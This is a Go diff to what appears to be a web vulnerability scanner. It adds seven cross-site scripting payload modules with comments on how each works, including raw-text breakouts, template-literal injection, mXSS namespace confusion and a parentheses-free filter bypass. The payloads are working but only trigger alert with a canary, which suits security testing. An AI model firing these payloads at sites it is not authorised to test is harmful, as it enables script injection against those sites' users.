@@ -102,6 +102,22 @@ func javascriptURIMatch(body, payload, canary string) (string, bool) {
 //   - javascript-uri: for a parameter that feeds an href/src/action rather
 //     than rendering into the page body directly (a "profile link", a
 //     redirect field used as a literal attribute value).
+//   - rawtext-breakout: closes textarea/title/style/xmp/iframe/noscript-style
+//     raw-text elements, where a plain "<script>" never runs.
+//   - unquoted-attribute-breakout: a space ends an unquoted attribute value,
+//     so the payload adds an event-handler attribute.
+//   - js-template-literal-interpolation / js-template-literal-breakout: a
+//     reflection inside a JS template literal, which runs ${...} directly or
+//     closes with a backtick.
+//   - svg-animate-onbegin: an SVG animate element whose onbegin handler fires
+//     on load, with no user interaction.
+//   - mxss-namespace-confusion: MathML/SVG wrappers that make a sanitizer's
+//     parse differ from the browser's second parse.
+//   - tagged-template-handler: alert`...` in an event handler, for filters that
+//     block parentheses.
+//
+// Every payload embeds the run's canary, so a match can only come from this
+// request. The payload set is 22 modules in all.
 var payloadModules = []payloadDef{
 	{
 		id: "script-tag", name: "Raw <script> tag injection", severity: "critical",
@@ -196,5 +212,66 @@ var payloadModules = []payloadDef{
 		id: "javascript-uri", name: "javascript: URI injection into href/src", severity: "medium",
 		build: func(c string) string { return fmt.Sprintf("javascript:/*%s*/alert(document.domain)", c) },
 		match: javascriptURIMatch,
+	},
+	{
+		// Closes whichever raw-text element the value sits in (textarea, title,
+		// style, xmp, iframe, noscript, ...). The first end tag that matches the
+		// real element is the one that counts, so listing all of them covers
+		// every raw-text context with one payload.
+		id: "rawtext-breakout", name: "Raw-text element breakout (textarea/title/style/...)", severity: "high",
+		build: func(c string) string {
+			return fmt.Sprintf(`</textarea></title></style></xmp></iframe></noscript></noembed></noframes><svg data-%s=1 onload=alert(document.domain)>`, c)
+		},
+		match: substringMatch,
+	},
+	{
+		// A space ends an unquoted attribute value, so the rest of the payload
+		// is parsed as new attributes, one of which is an event handler.
+		id: "unquoted-attribute-breakout", name: "Unquoted attribute value breakout", severity: "high",
+		build: func(c string) string {
+			return fmt.Sprintf(` autofocus data-%s=1 onfocus=alert(document.domain) x=`, c)
+		},
+		match: substringMatch,
+	},
+	{
+		// ${...} runs as an expression inside a JS template literal, so the
+		// payload needs no quote breakout at all.
+		id: "js-template-literal-interpolation", name: "JS template literal ${} interpolation", severity: "high",
+		build: func(c string) string { return fmt.Sprintf("${alert(/*%s*/document.domain)}", c) },
+		match: substringMatch,
+	},
+	{
+		// A backtick ends a template literal, then the rest is ordinary code.
+		id: "js-template-literal-breakout", name: "JS template literal breakout", severity: "high",
+		build: func(c string) string { return fmt.Sprintf("`;alert(/*%s*/document.domain);`", c) },
+		match: substringMatch,
+	},
+	{
+		// An SVG animate element fires its onbegin handler on its own when the
+		// document loads, so it needs no user interaction.
+		id: "svg-animate-onbegin", name: "<svg><animate onbegin> event-handler injection", severity: "high",
+		build: func(c string) string {
+			return fmt.Sprintf(`<svg><animate onbegin=alert(/*%s*/document.domain) attributeName=x dur=1s>`, c)
+		},
+		match: substringMatch,
+	},
+	{
+		// Namespace confusion: a MathML/SVG wrapper makes a sanitizer that
+		// parses the markup once see harmless text, while the browser's second
+		// parse turns the <img> into live HTML.
+		id: "mxss-namespace-confusion", name: "Namespace-confusion (mXSS) through MathML/SVG wrappers", severity: "high",
+		build: func(c string) string {
+			return fmt.Sprintf(`<math><mtext><table><mglyph><style><img data-%s=1 src=x onerror=alert(document.domain)>`, c)
+		},
+		match: substringMatch,
+	},
+	{
+		// A tagged template call (alert`...`) runs without parentheses, which
+		// evades filters that block "(" or match only alert(...).
+		id: "tagged-template-handler", name: "Event handler with tagged-template call (no parentheses)", severity: "high",
+		build: func(c string) string {
+			return fmt.Sprintf("<img data-%s=1 src=x onerror=alert`/*%s*/document.domain`>", c, c)
+		},
+		match: substringMatch,
 	},
 }
